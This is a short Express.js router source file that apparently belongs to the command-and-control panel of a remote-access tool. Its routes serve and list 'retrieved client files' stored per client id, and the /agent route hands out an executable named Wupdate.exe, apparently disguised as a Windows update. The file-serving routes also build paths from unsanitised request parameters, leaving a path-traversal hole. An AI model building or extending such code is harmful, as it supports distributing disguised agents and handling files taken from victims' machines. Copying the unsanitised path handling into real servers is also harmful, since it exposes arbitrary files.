let router = require('express').Router();
let webCookieValidator = require('../../Utils/MiddleWears/webCookieValidator');
const fs = require("fs");
const path = require("path");
const Utils = require("../../Utils/utilFunctions");
const appDir = path.dirname(require.main.filename);
const downloadsPath =path.resolve(appDir, 'Utils', 'clientFiles')

router.use(webCookieValidator);

//Server all retrieved client files
router.route('/:id/:file').get((req, res) => {
    let clientId =  req.params.id
    let fileName = req.params.file
    res.download(path.resolve(downloadsPath, clientId, fileName), fileName, (err)=>{
        if(err)
            Utils.LogToFile(`Error serving static client file ${fileName}, ${err.message}`)
    })
})

router.route('/agent').get((req, res) => {
    res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
    res.setHeader('Content-type', 'application/x-msdownload');
    let file = fs.createReadStream(path.resolve(appDir,'tool','Wupdate.exe'));
    file.pipe(res)
})

//Get all retrieved client files
router.route('/:id').get((req, res) => {
    let clientId =  req.params.id
    try{
        let allFiles = fs.readdirSync(path.resolve(downloadsPath, clientId))
        res.send(allFiles)
    }
    catch (err){
        res.send([])
    }
})

module.exports = router;